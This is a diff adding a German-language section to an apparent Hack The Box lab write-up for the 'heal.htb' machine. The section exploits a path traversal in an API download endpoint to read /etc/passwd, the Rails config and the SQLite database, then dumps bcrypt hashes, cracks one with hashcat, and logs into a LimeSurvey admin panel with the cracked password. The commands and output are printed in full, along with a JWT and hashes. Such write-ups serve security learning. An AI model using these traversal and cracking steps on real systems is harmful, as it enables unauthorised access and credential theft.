@@ -185,7 +185,179 @@ wie man sehen kann hat es ein admin panel, aber da ich die login daten nicht wei
 
 ## Ralphs password
 
-![auth](image-2.png)
 
-![token: ey](image-3.png)
+Nachdem auf der Survey expired‑Seite die Adresse ralph@heal.htb aufgetaucht war, brauchten wir nur noch dessen Kennwort, um uns in das Admin‑Backend einzuloggen.
+
+
+
+1. JWT‑Token abgreifen
+Beim Registrieren‑/Anmelden auf heal.htb wurde im Network‑Tab das JSON‑Feld token zurückgeliefert.
+
+![image with  in dev tools token: ey](image-3.png)
+
+```bash
+export TOKEN='eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo3fQ.bN47YVxPM1ZVqbw4J7oHZeDc3ixY3KO6yZpM5M3nfZE'
+```
+
+Mit einem schnellen Check verifizierte ich, dass das Token gültig war:
+
+```bash
+┌──(kali㉿kali)-[~/Desktop]
+└─$ curl -i -H "Authorization: Bearer $TOKEN" http://api.heal.htb/profile  
+HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Sat, 19 Apr 2025 21:17:14 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 86
+Connection: keep-alive
+x-frame-options: SAMEORIGIN
+x-xss-protection: 0
+x-content-type-options: nosniff
+x-permitted-cross-domain-policies: none
+referrer-policy: strict-origin-when-cross-origin
+vary: Accept, Origin
+etag: W/"534bdd1e70aef84ee6023d1856c79b2e"
+cache-control: max-age=0, private, must-revalidate
+x-request-id: 5aba65c9-294b-432b-96df-f578c04f8c48
+x-runtime: 0.003895
+
+{"id":7,"email":"lyfe@gmail.com","fullname":"lyfe","username":"lyfe","is_admin":false}  
+```
+
+2. Path‑Traversal verifizieren
+Um die benötigte Anzahl ../ zu bestimmen, habe ich ein Mini‑Loop gebaut:
+
+```bash
+for d in {3..9}; do
+  printf "[%s] " $d
+  curl -s -H "Authorization: Bearer $TOKEN" \
+       "http://api.heal.htb/download?filename=$(printf '../%.0s' $(seq 1 $d))/etc/passwd" |
+       head -1
+done
+```
+
+Ergebnis - bei fünf Punkten erschien /etc/passwd, Tiefe 2 zeigte eine vorhandene config.ru:
+
+```
+[3] {"errors":"File not found"}[4] {"errors":"File not found"}[5] root:x:0:0:root:/root:/bin/bash
+[6] root:x:0:0:root:/root:/bin/bash
+[7] root:x:0:0:root:/root:/bin/bash
+[8] root:x:0:0:root:/root:/bin/bash
+[9] root:x:0:0:root:/root:/bin/bash
+```
+
+
+3. Rails‑Konfiguration exfiltrieren
+
+```bash
+curl -s -H "Authorization: Bearer $TOKEN" \
+     "http://api.heal.htb/download?filename=../../config/database.yml" \
+     -o database.yml
+```
+
+output (unser ziel ist production):
+
+```yaml
+# SQLite. Versions 3.8.0 and up are supported.
+#   gem install sqlite3
+#
+#   Ensure the SQLite 3 gem is defined in your Gemfile
+#   gem "sqlite3"
+#
+default: &default
+  adapter: sqlite3
+  pool: <%= ENV.fetch("RAILS_MAX_THREADS") { 5 } %>
+  timeout: 5000
+
+development:
+  <<: *default
+  database: storage/development.sqlite3
+
+# Warning: The database defined as "test" will be erased and
+# re-generated from your development database when you run "rake".
+# Do not set this db to the same as development or production.
+test:
+  <<: *default
+  database: storage/test.sqlite3
+
+production:
+  <<: *default
+  database: storage/development.sqlite3
+```
+4. SQLite‑DB herunterladen
+
+```bash
+curl -s -H "Authorization: Bearer $TOKEN" \
+     "http://api.heal.htb/download?filename=../../storage/development.sqlite3" \
+     -o dev.sqlite3
+file dev.sqlite3          # → SQLite 3.x database
+```
+output: 
+
+```
+dev.sqlite3: SQLite 3.x database, last written using SQLite version 3045002, writer version 2, read version 2, file counter 2, database pages 8, cookie 0x4, schema 4, UTF-8, version-valid-for 2
+
+```
+
+5. Hashes dumpen
+
+```bash
+sqlite3 dev.sqlite3 \
+  "SELECT email, password_digest FROM users;" > hashes.txt
+```
+
+hashes.txt:
+```txt
+ralph@heal.htb|$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG
+test@htb.com|$2a$12$b/eb1KU/r9RfpyVRp2aBP.rDxE3p7.rRAjM8lCd0iLUnZh26VSpu.
+nullbyte@heal.htb|$2a$12$xTfKk9gpBpZiSvIE.T5mMufHbAm/.c/kDKTBYg8cKcHxPwwU7gJgy
+asdasd@gmail.com|$2a$12$5BTVuxrZTe31BRYWHD2ex.1FdTANkQnqSsaGwWgHBGq0heNTDlqGG
+admii@gmail.com|$2a$12$HqR3ffCia8NuIrBFjS6tvexo/DDeBlCV5pwvo.v3WO6Z0iZM1/vaG
+admin@gmail.com|$2a$12$Xe.3wFV2bDQHgJ8Bx6zX.uRho9IqV9i1o5mYT8x/0N.DSdLX25.GO
+lyfe@gmail.com|$2a$12$j6pguy5SKwp6DppLiMtz1OQJS9ALkxTGInJkB9f/o6zcms5.D5Zre
+```
+
+
+6. Nur Ralphs Hash isolieren & cracken
+
+```bash
+grep '^ralph@' hashes.txt | cut -d'|' -f2 > ralph.hash
+```
+```bash
+# rockyou ggf. entpacken da ich es noch nicht entpackt hatte:
+sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
+```
+```bash
+# show flag zeigt den output an
+hashcat -m 3200 ralph.hash /usr/share/wordlists/rockyou.txt --show
+```
+
+Hashcat‑Output:
+
+`$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG:147258369`
+
+nice, jetzt haben wir ralphs pwd: `147258369`
+
+7. Erfolgreicher Admin‑Login
+Mit
+
+```
+Benutzer : ralph@heal.htb
+Passwort : 147258369
+```
+
+konnte ich mich unter http://take‑survey.heal.htb/admin einloggen und erhielt vollen Zugriff auf das LimeSurvey‑Backend (Version 6.6.4).
+
+![alt text](Screenshot_2025-04-19_17_49_00.png)
+
+
+
+
+
+
+
+
+
+
+
 
